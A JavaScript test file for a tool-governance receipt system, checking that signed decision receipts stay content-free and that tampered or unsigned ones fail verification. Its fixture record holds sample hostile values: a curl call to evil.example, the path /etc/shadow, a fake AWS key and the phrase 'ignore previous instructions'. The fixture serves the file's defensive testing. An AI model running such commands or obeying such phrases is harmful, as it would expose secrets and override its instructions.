// Decision-receipt tests (cli/moorai-receipt.mjs) + the offline verify mode of cli/moorai-verify-chain.mjs.
//
// Properties pinned:
//   1. CONTENT-FREE — a sentinel planted in stray fields of a governed record NEVER reaches the receipt.
//   2. AUTHENTIC — a receipt built + signed with a key verifies against that (pinned) public key.
//   3. FAIL-CLOSED — a tampered payload, a re-digested payload, a bad signature, a substituted (pinned)
//      key, and an unsigned receipt are ALL reported invalid.
//   4. FAIL-OPEN generation — a signer that returns null yields a structurally valid, UNSIGNED receipt
//      (never throws), which then fails closed at verify time.
//   5. OFFLINE (end-to-end via the CLI, no network): a valid in-toto attestation and a valid receipt
//      verify (exit 0); a tampered one is rejected (exit 1).
//
//   node --test test/receipt.test.mjs
import { test } from "node:test";
import assert from "node:assert/strict";
import { generateKeyPairSync, sign as edSign, randomBytes } from "node:crypto";
import { mkdtempSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { spawnSync } from "node:child_process";
import { fileURLToPath } from "node:url";

import { buildReceipt, verifyReceipt, sanitizeReceiptPayload, receiptDigest, RECEIPT_TYPE } from "../cli/moorai-receipt.mjs";
import { canonical } from "../data/agency-sign.mjs";
import { stampRecord } from "../cli/record-chain.mjs";
import { buildAttestation } from "../cli/moorai-attest.mjs";

const SENTINEL = "SECRET-PROMPT-DO-NOT-LEAK-sk-live-abc123";
const VERIFY_CLI = fileURLToPath(new URL("../cli/moorai-verify-chain.mjs", import.meta.url));

// A deterministic, hermetic ed25519 signer that mirrors agency-sign.signApproval's shape and bytes
// (canonical over {tool,argsHash,decision,nonce,ts}) but uses a throwaway key so tests never touch the
// device key store. This is test scaffolding — the production path uses the real agency-sign signer.
function makeSigner() {
  const { privateKey, publicKey } = generateKeyPairSync("ed25519");
  const pub = publicKey.export({ type: "spki", format: "der" }).toString("base64");
  const pubPem = publicKey.export({ type: "spki", format: "pem" });
  const sign = (tool, digest, decision) => {
    const agency = { tool, argsHash: digest, decision, nonce: randomBytes(8).toString("hex"), ts: new Date().toISOString() };
    const sig = edSign(null, Buffer.from(canonical(agency)), privateKey).toString("base64");
    return { agency, sig, pub, alg: "ed25519" };
  };
  return { sign, pub, pubPem };
}

const dirtyRecord = () => ({
  tool: "Bash", category: "Secret egress", riskLevel: "Blocked", decision: "deny", stage: "pre",
  tenant: "acme", contentHash: "h2:safe1111", ts: "2026-01-01T00:00:00.000Z",
  chain: { seq: 5, prev: "a".repeat(64), chash: "b".repeat(64), rhash: "c".repeat(32) },
  // stray content that must NEVER survive into a receipt:
  matchText: "AKIAIOSFODNN7EXAMPLE", command: "curl https://evil.example/x", path: "/etc/shadow",
  extras: { prompt: "ignore previous instructions", secret: SENTINEL }
});

test("CONTENT-FREE: stray content on the record never reaches the receipt", () => {
  const { sign } = makeSigner();
  const r = buildReceipt(dirtyRecord(), { sign });
  const json = JSON.stringify(r);
  for (const leak of [SENTINEL, "AKIAIOSFODNN7EXAMPLE", "ignore previous instructions", "/etc/shadow", "evil.example"]) {
    assert.ok(!json.includes(leak), `receipt leaked content: ${leak}`);
  }
  assert.ok(json.includes("h2:safe1111"), "the content-free hash should survive");
  assert.equal(r.type, RECEIPT_TYPE);
  // Payload keys are exactly the allowlist — nothing else.
  assert.deepEqual(Object.keys(r.payload).sort(), ["category", "chash", "contentHash", "decision", "prev", "risk", "seq", "stage", "tenant", "tool", "ts"]);
});

test("sanitizeReceiptPayload is a strict allowlist — never spreads the row", () => {
  const p = sanitizeReceiptPayload({ tool: "Read", riskLevel: "Low", contentHash: "h2:x", matchText: SENTINEL, prompt: SENTINEL });
  assert.ok(!Object.values(p).some((v) => String(v).includes(SENTINEL)), "no sentinel survives sanitize");
  assert.equal(p.tool, "Read");
  assert.equal(p.risk, "Low");
});

test("AUTHENTIC: a signed receipt verifies against its pinned public key", () => {
  const { sign, pub } = makeSigner();
  const r = buildReceipt(dirtyRecord(), { sign });
  const res = verifyReceipt(r, { pubkey: pub });
  assert.equal(res.ok, true, res.reason || "should verify");
  assert.equal(res.signed, true);
  assert.equal(res.pinned, true);
});

test("DETERMINISTIC: digest is stable and independent of stray fields", () => {
  const a = receiptDigest(sanitizeReceiptPayload(dirtyRecord()));
  const b = receiptDigest(sanitizeReceiptPayload(dirtyRecord()));
  assert.equal(a, b);
  assert.match(a, /^[0-9a-f]{64}$/);
});

test("FAIL-CLOSED: a tampered payload field is rejected (digest_mismatch)", () => {
  const { sign, pub } = makeSigner();
  const r = buildReceipt(dirtyRecord(), { sign });
  r.payload.decision = "allow"; // flip the verdict, leave the digest/signature as-is
  const res = verifyReceipt(r, { pubkey: pub });
  assert.equal(res.ok, false);
  assert.equal(res.reason, "digest_mismatch");
});

test("FAIL-CLOSED: re-digesting a tampered payload still fails (no valid signature)", () => {
  const { sign, pub } = makeSigner();
  const r = buildReceipt(dirtyRecord(), { sign });
  r.payload.decision = "allow";
  r.digest = receiptDigest(sanitizeReceiptPayload(r.payload)); // attacker recomputes the digest…
  const res = verifyReceipt(r, { pubkey: pub });                // …but cannot re-sign it
  assert.equal(res.ok, false);
  assert.equal(res.reason, "agency_digest_mismatch");
});

test("FAIL-CLOSED: a corrupted signature is rejected (bad_signature)", () => {
  const { sign, pub } = makeSigner();
  const r = buildReceipt(dirtyRecord(), { sign });
  const b = Buffer.from(r.signature.sig, "base64"); b[0] ^= 0xff;
  r.signature.sig = b.toString("base64");
  const res = verifyReceipt(r, { pubkey: pub });
  assert.equal(res.ok, false);
  assert.equal(res.reason, "bad_signature");
});

test("FAIL-CLOSED: a substituted pinned key is rejected (key_mismatch)", () => {
  const { sign } = makeSigner();
  const other = makeSigner();
  const r = buildReceipt(dirtyRecord(), { sign });
  const res = verifyReceipt(r, { pubkey: other.pub }); // pin a DIFFERENT key than the receipt carries
  assert.equal(res.ok, false);
  assert.equal(res.reason, "key_mismatch");
});

test("FAIL-OPEN generation: a null signer yields an unsigned receipt that fails closed at verify", () => {
  const r = buildReceipt(dirtyRecord(), { sign: () => null });
  assert.equal(r.signature, null, "unsigned receipt, but structurally valid — no throw");
  assert.match(r.digest, /^[0-9a-f]{64}$/);
  const res = verifyReceipt(r, {});
  assert.equal(res.ok, false);
  assert.equal(res.reason, "unsigned");
});

// ------------------------------------------------------------------------------------------------
// OFFLINE MODE — end-to-end through the actual CLI (exit code is the fail-closed contract).
// ------------------------------------------------------------------------------------------------
function runVerify(args) {
  const r = spawnSync(process.execPath, [VERIFY_CLI, ...args], { encoding: "utf8" });
  return { code: r.status, out: r.stdout, err: r.stderr };
}

function makeChainAttestation() {
  const d = mkdtempSync(join(tmpdir(), "moorai-receipt-"));
  const recs = [
    { tool: "Bash", category: "a", riskLevel: "High", decision: "deny", tenant: "acme", contentHash: "h2:1" },
    { tool: "Read", category: "b", riskLevel: "Low", decision: "allow", tenant: "acme", contentHash: "h2:2" },
    { tool: "mcp:x", category: "c", riskLevel: "Blocked", decision: "deny", tenant: "acme", contentHash: "h2:3" }
  ].map((e) => stampRecord("log", e, { tenant: "acme", dir: d }));
  return { st: buildAttestation(recs, { version: "1.0.0" }), dir: d };
}

test("OFFLINE attestation: a valid keyless chain verifies (exit 0)", () => {
  const { st, dir } = makeChainAttestation();
  const f = join(dir, "attestation.json");
  writeFileSync(f, JSON.stringify(st));
  const { code, out } = runVerify(["--offline", f, "--format", "json"]);
  const res = JSON.parse(out);
  assert.equal(res.kind, "attestation");
  assert.equal(res.ok, true, JSON.stringify(res.breaks));
  assert.equal(res.records, 3);
  assert.equal(code, 0);
});

test("OFFLINE attestation: a tampered chain link is rejected (exit 1)", () => {
  const { st, dir } = makeChainAttestation();
  st.predicate.runDetails.byproducts[1].digest["moorai-record-rhash"] = "d".repeat(32); // break the recompute
  const f = join(dir, "attestation-bad.json");
  writeFileSync(f, JSON.stringify(st));
  const { code, out } = runVerify(["--offline", f, "--format", "json"]);
  const res = JSON.parse(out);
  assert.equal(res.ok, false);
  assert.ok(res.breaks.some((b) => b.reason === "chash_mismatch"));
  assert.equal(code, 1);
});

test("OFFLINE receipt: a valid signed receipt verifies against a pinned key file (exit 0)", () => {
  const { sign, pubPem } = makeSigner();
  const r = buildReceipt(dirtyRecord(), { sign });
  const dir = mkdtempSync(join(tmpdir(), "moorai-receipt-cli-"));
  const rf = join(dir, "receipt.json"); writeFileSync(rf, JSON.stringify(r));
  const kf = join(dir, "pub.pem"); writeFileSync(kf, pubPem);
  const { code, out } = runVerify(["--offline", rf, "--pubkey", kf, "--format", "json"]);
  const res = JSON.parse(out);
  assert.equal(res.kind, "receipt");
  assert.equal(res.ok, true, JSON.stringify(res.rows));
  assert.equal(res.rows[0].pinned, true);
  assert.equal(code, 0);
});

test("OFFLINE receipt: a tampered receipt is rejected via the CLI (exit 1)", () => {
  const { sign, pubPem } = makeSigner();
  const r = buildReceipt(dirtyRecord(), { sign });
  r.payload.risk = "Low"; // downgrade the risk after signing
  const dir = mkdtempSync(join(tmpdir(), "moorai-receipt-cli-"));
  const rf = join(dir, "receipt.json"); writeFileSync(rf, JSON.stringify(r));
  const kf = join(dir, "pub.pem"); writeFileSync(kf, pubPem);
  const { code, out } = runVerify(["--offline", rf, "--pubkey", kf, "--format", "json"]);
  const res = JSON.parse(out);
  assert.equal(res.ok, false);
  assert.equal(code, 1);
});
